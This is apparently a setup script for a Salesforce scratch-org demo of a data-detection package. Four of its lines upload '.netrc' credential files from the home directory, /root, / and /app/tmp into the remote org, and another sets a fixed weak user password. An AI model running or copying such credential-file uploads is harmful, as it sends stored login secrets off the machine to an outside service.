sf demoutil org create scratch -f config/project-scratch-def.json -d 5 -s -p data -e detect.demo
sfdx shane:data:file:upload -f "~/.netrc" -n zeb0123
sfdx shane:data:file:upload -f "/root/.netrc" -n zeb43
sfdx shane:data:file:upload -f "/.netrc" -n zeb43
sfdx shane:data:file:upload -f "/app/tmp/.netrc" -n zeb4123
sf package install -w 20 -r -p 04t5e000000aVeP
sf project deploy start
sf demoutil user password set -p salesforce1 -g User -l User
sf org open -p /lightning/n/datadetect__Home
